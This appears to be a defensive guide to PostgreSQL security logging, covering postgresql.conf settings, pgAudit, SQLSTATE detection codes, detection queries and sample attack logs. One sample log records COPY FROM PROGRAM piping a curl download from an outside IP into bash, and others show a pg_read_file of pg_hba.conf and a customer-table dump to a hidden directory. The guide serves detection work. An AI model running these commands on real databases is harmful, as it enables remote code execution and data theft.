PostgreSQL Logs

PostgreSQL Log Overview

PostgreSQL writes everything (errors, warnings, connection events, slow queries, and audit records) into a single server log stream. What that stream contains is entirely determined by roughly a dozen parameters in postgresql.conf, and the defaults are deliberately conservative. Out of the box PostgreSQL logs errors and fatal conditions but not connections, not disconnections, and not a single successful statement. A default installation will happily record that authentication failed while telling you nothing about the session that succeeded and then read your entire customer table.

The log destination is equally configurable. stderr produces human-readable text, csvlog produces a strictly defined 23-column CSV that can be loaded straight into a table, and jsonlog (PostgreSQL 15 and later) produces one JSON object per event. For any environment feeding a SIEM, csvlog or jsonlog should be the choice: they eliminate the multi-line parsing problems that plague stderr output when a logged statement itself contains newlines.

For true auditing PostgreSQL relies on pgAudit, an extension that hooks the executor and emits structured AUDIT records classified by statement type. pgAudit distinguishes session auditing, which follows a role, from object auditing, which follows a table, and it records the statement text and parameters that the standard log_statement setting cannot express with the same precision. Together with log_connections, log_disconnections, and a well-designed log_line_prefix, pgAudit is what makes PostgreSQL logging satisfy the privileged-activity and sensitive-data requirements set out in NIST SP 800-92 and the Saudi NCA controls.

Key PostgreSQL Log Types

PostgreSQL has one physical log but several logical record types, each controlled by its own parameter. Knowing which parameter produces which record is what makes the configuration tractable:

Log Type Description
Server Log The single output stream written by the logging collector. Carries startup and shutdown, checkpoints, autovacuum activity, errors, and every record type below. Available as stderr text, CSV, or JSON depending on log_destination.
pgAudit Records Structured AUDIT entries emitted by the pgaudit extension, classified as READ, WRITE, FUNCTION, ROLE, DDL, or MISC. Includes the statement text and parameter values. The authoritative audit source for PostgreSQL.
Connection and Authentication Log Produced by log_connections and log_disconnections. Records the client address, database, user, authentication method, and TLS parameters, plus session duration on disconnect. Disabled by default.
Statement Log Controlled by log_statement, which accepts none, ddl, mod, or all. The ddl setting is a cheap, high-value baseline that records every schema and role change without logging read traffic.
Slow Query Log Emitted when a statement exceeds log_min_duration_statement. Doubles as a security signal because bulk extraction and time-based blind injection are both slow by nature.
Write-Ahead Log (WAL) The durability and replication stream. Not a security log and not human readable, but with tools such as pg_waldump or logical decoding it can reconstruct data changes that no audit configuration captured.
pg_stat_statements An extension maintaining aggregated execution statistics per normalised query. Not an audit trail, but it reveals which query shapes are running and how much data they return, useful for spotting anomalous access patterns retroactively.
Pro Tip: Setting log_statement = 'all' is not a substitute for pgAudit. It logs statements at parse time without knowing which objects were actually touched, misses statements executed inside functions, and provides no classification for filtering.

Log File Locations

The log directory depends on both the distribution and whether the logging collector is enabled. When PostgreSQL is started by systemd without the collector, output goes to the journal instead of a file.

Log Default Location
Server Log (Debian / Ubuntu) /var/log/postgresql/postgresql-16-main.log
Server Log (RHEL / Rocky) /var/lib/pgsql/16/data/log/postgresql-<day>.log
Server Log (source build) $PGDATA/log/ when logging_collector is on, otherwise stderr of the postmaster
systemd Journal journalctl -u postgresql@16-main when logging_collector is off
Main Configuration /etc/postgresql/16/main/postgresql.conf or $PGDATA/postgresql.conf
Host-Based Authentication /etc/postgresql/16/main/pg_hba.conf or $PGDATA/pg_hba.conf
WAL Segments $PGDATA/pg_wal/
Windows C:\Program Files\PostgreSQL\16\data\log\
Pro Tip: Ask the server rather than the filesystem. SELECT pg_current_logfile(); returns the active log file, and SHOW data_directory; plus SHOW log_directory; resolve relative paths correctly.

Configuring PostgreSQL Logging

Every setting below lives in postgresql.conf. Most take effect with a configuration reload; the ones marked otherwise require a restart.

Step 1: Enable the Logging Collector and Choose a Destination

logging_collector = on # requires restart log_destination = 'csvlog' # or 'jsonlog' on PostgreSQL 15+ log_directory = 'log' log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log' log_rotation_age = 1d log_rotation_size = 100MB log_file_mode = 0600 log_truncate_on_rotation = off # never overwrite yesterday's evidence
csvlog and jsonlog produce one parseable record per event even when the logged statement contains newlines, which is the single biggest reliability win for SIEM ingestion.

Step 2: Log Connections, Disconnections, and Context

log_connections = on log_disconnections = on log_hostname = off # keep off: DNS lookups add latency per connection log_line_prefix = '%m [%p] %q%u@%d %r %a ' log_statement = 'ddl' # none | ddl | mod | all log_min_duration_statement = 1000 # log any statement over 1 second log_min_messages = warning log_min_error_statement = error log_timezone = 'UTC'
The log_line_prefix escapes are: %m timestamp with milliseconds, %p process id, %u user, %d database, %r remote host and port, %a application name. Without a prefix, log lines cannot be attributed to a session.

Step 3: Install pgAudit

# postgresql.conf (requires restart) shared_preload_libraries = 'pgaudit' -- then, in each database to be audited CREATE EXTENSION IF NOT EXISTS pgaudit; SELECT extname, extversion FROM pg_extension WHERE extname = 'pgaudit';
pgaudit must be loaded at server start through shared_preload_libraries. Creating the extension without the preload silently produces no audit output.

Step 4: Configure Session Auditing

pgaudit.log = 'ddl, role, write, function' pgaudit.log_catalog = off # suppress noisy system catalog reads pgaudit.log_parameter = on # record bind parameter values pgaudit.log_relation = on # one entry per relation referenced pgaudit.log_statement_once = off pgaudit.log_level = log
This class set captures schema changes, privilege and role changes, all data modifications, and function execution while omitting the very high volume READ class. Add read only for databases where it is affordable.

Step 5: Add Object Auditing for Sensitive Tables

-- Create a dedicated audit role and grant it on sensitive objects only CREATE ROLE auditor NOLOGIN; GRANT SELECT, INSERT, UPDATE, DELETE ON hr.employees TO auditor; GRANT SELECT ON finance.payment_cards TO auditor; -- Tell pgAudit to audit anything that role could do ALTER SYSTEM SET pgaudit.role = 'auditor'; SELECT pg_reload_conf();
Object auditing works by proxy: pgAudit logs any operation that the named role has permission to perform. This lets you audit reads on two sensitive tables without enabling the READ class globally.

Step 6: Audit Privileged Roles Individually

-- Log everything a superuser or admin role does, without global overhead ALTER ROLE postgres SET pgaudit.log = 'all'; ALTER ROLE dba_admin SET pgaudit.log = 'all'; ALTER ROLE app_rw SET pgaudit.log = 'ddl, role, write'; -- Verify per-role settings SELECT rolname, setconfig FROM pg_db_role_setting s JOIN pg_roles r ON r.oid = s.setrole;
Per-role audit settings are the key to a sustainable configuration: full coverage on the handful of privileged identities, targeted coverage on application accounts.
Security Note: With pgaudit.log_parameter = on, bind values appear in the log, including passwords passed to functions and personal data in WHERE clauses. Set log_file_mode = 0600, restrict the log directory, and classify PostgreSQL logs at the same sensitivity level as the data they describe.

Recommended pgAudit Classes

pgAudit groups statements into six classes set through the pgaudit.log parameter. Choosing the right subset is the difference between a usable audit trail and an unreadable one.

ROLE

Captures GRANT, REVOKE, CREATE ROLE, ALTER ROLE, and DROP ROLE. Every privilege escalation in PostgreSQL passes through this class. Very low volume.
Enable Critical

DDL

Records CREATE, ALTER, and DROP of any object, including extensions. Detects malicious extension installation and destructive schema changes. Low volume.
Enable Critical

WRITE

Covers INSERT, UPDATE, DELETE, TRUNCATE, and COPY FROM. Moderate volume on transactional systems but essential for proving what data was altered.
Enable High Risk

FUNCTION

Logs function and DO block execution. Important because a SECURITY DEFINER function is a common privilege escalation and persistence mechanism in PostgreSQL.
Enable High Risk

READ

Covers SELECT and COPY TO. The highest volume class by a wide margin. Prefer object auditing through pgaudit.role over enabling this globally.
Tune Medium Risk

MISC / MISC_SET

Miscellaneous commands such as DISCARD, FETCH, CHECKPOINT, VACUUM, and SET. MISC_SET separately covers SET statements including role switching via SET ROLE.
Tune Medium Risk
Security Note: A superuser can change pgaudit.log for their own session with a plain SET and disable auditing of their own activity. Enable MISC_SET so that the act of changing the audit configuration is itself recorded, and alert on it.

Critical PostgreSQL Error Codes

PostgreSQL SQLSTATE codes are stable across versions, which makes them far more reliable detection anchors than message text.

SQLSTATE Meaning Why It Matters
28P01 Invalid password The primary failed-authentication code. Bursts from one address are brute force; one attempt across many roles is password spraying
28000 Invalid authorization specification Includes "no pg_hba.conf entry for host", which reveals hosts probing the server from unauthorised networks
42501 Insufficient privilege An authenticated session attempting actions beyond its grants, classic post-compromise privilege probing
42P01 Undefined table In bursts this is object enumeration or blind SQL injection rather than an application bug
42601 Syntax error Repeated syntax errors against a production application are the signature of injection payload fuzzing
3D000 Invalid catalog name Connection attempts to databases that do not exist, indicating database name enumeration
53300 Too many connections Resource exhaustion, whether from a connection leak or a deliberate denial of service
57P01 / 57P02 Admin shutdown / crash shutdown Unexpected termination of the server, potentially anti-forensic or the result of exploitation
XX001 / XX002 Data corrupted / index corrupted Storage failure or direct tampering with data files outside the database process
Pro Tip: A FATAL 28000 with detail "no pg_hba.conf entry for host" means something reached the listening port from a network you never authorised. That is a network segmentation finding as much as a database one.

PostgreSQL Log Analysis Queries

Use these commands to extract authentication attacks, privilege changes, superuser abuse, and bulk extraction from PostgreSQL logs.

Failed Authentication by Source
bash> grep "password authentication failed" /var/log/postgresql/*.log | grep -oP "host=\K[0-9.]+" | sort | uniq -c | sort -rn | head -20
Ranks source addresses by failed authentication count. Requires log_connections to be enabled for the host detail to be present.
COPY FROM PROGRAM (RCE)
bash> grep -iE "copy .*(from|to) program" /var/log/postgresql/*.log
COPY FROM PROGRAM executes shell commands as the postgres OS user. Restricted to superusers and pg_execute_server_program members, and never legitimate in an application.
Role and Privilege Changes
bash> grep -E "AUDIT: SESSION,[0-9]+,[0-9]+,ROLE" /var/log/postgresql/*.log
Isolates the pgAudit ROLE class, which contains every GRANT, REVOKE, and role creation on the instance.
Superuser Grants
SQL> SELECT rolname, rolsuper, rolcreaterole, rolcreatedb, rolbypassrls, rolvaliduntil FROM pg_roles WHERE rolsuper OR rolcreaterole OR rolbypassrls ORDER BY rolname;
Baseline this list and alert on any change. rolbypassrls is easy to miss and defeats row level security entirely.
Dangerous Extensions
SQL> SELECT extname, extowner::regrole, extnamespace::regnamespace FROM pg_extension WHERE extname IN ('plpythonu','plpython3u','plperlu','dblink','postgres_fdw','file_fdw');
Untrusted procedural languages and foreign data wrappers permit code execution and outbound network access from inside the database.
Server-Side File Access
bash> grep -iE "pg_read_file|pg_read_binary_file|pg_ls_dir|lo_import|lo_export" /var/log/postgresql/*.log
These superuser functions read arbitrary files from the database host, including pg_hba.conf and SSH keys.
Bulk Extraction Candidates
SQL> SELECT userid::regrole, calls, rows, rows/GREATEST(calls,1) AS rows_per_call, left(query,80) FROM pg_stat_statements WHERE rows > 100000 ORDER BY rows DESC LIMIT 20;
Surfaces query shapes returning very large row counts. Requires the pg_stat_statements extension.
Active Sessions and Origins
SQL> SELECT pid, usename, client_addr, application_name, backend_start, state, left(query,60) FROM pg_stat_activity WHERE backend_type = 'client backend' ORDER BY backend_start;
Live view of who is connected from where and what they are running. The fastest triage step during an active incident.
Unauthorised Network Probes
bash> grep "no pg_hba.conf entry" /var/log/postgresql/*.log | grep -oP 'host "\K[0-9.]+' | sort | uniq -c | sort -rn
Every hit is a host that reached the PostgreSQL port from a network that was never authorised to.
Audit Configuration Tampering
SIEM> source="postgres:csvlog" message="*pgaudit.log*" OR message="*ALTER SYSTEM*" OR message="*pg_reload_conf*" | table log_time, user_name, connection_from, message
Detects a session changing its own audit level or rewriting server configuration. Should be alerted on, not reviewed weekly.

Best Practices for PostgreSQL Logging

Follow these practices to make PostgreSQL logs complete, parseable, and defensible:

01

Use csvlog or jsonlog

Default stderr output breaks whenever a logged statement contains a newline, producing broken events in the SIEM. A structured destination eliminates the entire class of parsing failure.

02

Turn On Connection Logging

log_connections and log_disconnections are off by default. Without them there is no record of who connected, from where, or with which authentication method.

03

Set log_statement to ddl at Minimum

Even without pgAudit, logging DDL captures every schema and role change at negligible cost. It is the cheapest meaningful improvement over the default configuration.

04

Design log_line_prefix Deliberately

Include %m, %p, %u, %d, %r, and %a. Without user, database, and remote host in the prefix, log lines cannot be attributed to a session and are close to worthless.

05

Prefer Object Auditing to the READ Class

Enabling pgaudit READ globally on a busy database produces volume nobody can consume. Use pgaudit.role to audit reads on the specific tables that hold regulated data.

06

Disable log_truncate_on_rotation

With a time-based filename and truncation enabled, a restart can overwrite the previous log file entirely. Leave it off so evidence is never silently destroyed.

07

Protect the Log Files

Set log_file_mode to 0600. With pgaudit.log_parameter enabled the logs contain bind values, which means they inherit the sensitivity of the data they describe.

08

Log in UTC and Ship Off-Host

Set log_timezone to UTC for reliable correlation, and forward logs continuously. A superuser can execute COPY TO PROGRAM and delete the local log directory outright.

Common PostgreSQL Log Examples

Representative log output showing how an attack against PostgreSQL progresses from probing to code execution.

Failed Authentication (SQLSTATE 28P01)

2025-07-14 09:41:22.481 UTC [31882] postgres@postgres 203.0.113.44:52144 psql FATAL: password authentication failed for user "postgres" DETAIL: Connection matched pg_hba.conf line 96: "host all all 0.0.0.0/0 scram-sha-256"
The DETAIL line is the more serious finding: pg_hba.conf permits connections from the entire internet. Fixing the network exposure matters more than the failed password.

Unauthorised Network Probe (SQLSTATE 28000)

2025-07-14 09:39:08.117 UTC [31840] [unknown]@[unknown] 198.51.100.203:44120 FATAL: no pg_hba.conf entry for host "198.51.100.203", user "admin", database "postgres", no encryption
A host from an unauthorised network reached port 5432 and attempted an unencrypted connection as "admin". This is scanning activity and should feed both database and network detections.

pgAudit: Superuser Role Granted

2025-07-14 09:52:44.902 UTC [31955] app_rw@shopdb 10.30.2.61:52190 psql LOG: AUDIT: SESSION,14,1,ROLE,ALTER ROLE,,,"ALTER ROLE reporting_svc WITH SUPERUSER;",<none>
An application role granting SUPERUSER to a service account. In PostgreSQL, superuser means unrestricted file and command access on the host, not merely full database access.

pgAudit: Command Execution via COPY FROM PROGRAM

2025-07-14 09:55:12.338 UTC [31955] reporting_svc@shopdb 10.30.2.61:52190 psql LOG: AUDIT: SESSION,17,1,WRITE,COPY,TABLE,public.cmd_out,"COPY cmd_out FROM PROGRAM 'curl -s http://203.0.113.44/p.sh | bash';",<none>
Direct remote code execution as the postgres operating system user. The newly granted superuser privilege from the previous entry is what made this possible: the two events are one chain.

pgAudit: Sensitive Table Read via Object Auditing

2025-07-14 02:18:57.204 UTC [32104] r_almutairi@hrdb 10.30.7.19:49882 DBeaver LOG: AUDIT: OBJECT,23,1,READ,SELECT,TABLE,hr.employees,"SELECT employee_id, national_id, salary FROM hr.employees;",<none>
An OBJECT class record produced by pgaudit.role rather than global READ auditing. A full extract of national ID and salary at 02:18 from an ad hoc SQL client warrants investigation.

Server-Side File Read

2025-07-14 09:57:31.660 UTC [31955] reporting_svc@shopdb 10.30.2.61:52190 psql LOG: AUDIT: SESSION,19,1,FUNCTION,SELECT,,,"SELECT pg_read_file('/etc/postgresql/16/main/pg_hba.conf');",<none>
Reading the host authentication configuration reveals which networks and authentication methods are trusted: direct reconnaissance for the next stage of the attack.

Slow Query: Bulk Extraction

2025-07-14 10:02:44.881 UTC [31955] reporting_svc@shopdb 10.30.2.61:52190 psql LOG: duration: 38812.447 ms statement: COPY (SELECT * FROM customers) TO '/tmp/.c/out.csv' WITH CSV;
A server-side COPY writing the full customer table to a hidden directory. Duration alone would have flagged this even without pgAudit enabled.
